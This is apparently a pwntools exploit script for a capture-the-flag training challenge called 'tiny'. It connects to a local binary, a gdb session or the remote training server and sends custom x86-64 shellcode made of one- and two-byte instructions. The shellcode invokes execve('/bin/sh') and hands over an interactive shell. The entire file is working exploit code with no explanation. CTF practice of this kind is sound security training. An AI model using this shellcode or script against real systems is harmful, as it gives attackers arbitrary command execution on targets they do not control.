from pwn import *

COMMANDS = """
b *0x0000000000401b9e
c
"""
context.arch = "amd64"

# python3 b.py DEBUG

if args.REMOTE:
    c = remote("tiny.training.offensivedefensive.it", 8080, ssl=True)
else:
    if args.GDB:
        c = gdb.debug("./tiny", gdbscript=COMMANDS)
    else:
        c = process("./tiny")

c.recvuntil(b"Can you pop a shell with a shellcode made of 1 or 2 bytes instructions?\n > ")

shellcode = """
xor esi, esi
push rdx
pop rax
add al, 16
push rax
pop rdi
xor eax, eax
mov al, 0x3b
xor edx, edx
syscall
"""
shellcode_c = asm(shellcode)

c.send(shellcode_c + b"/bin/sh\0")
c.interactive()
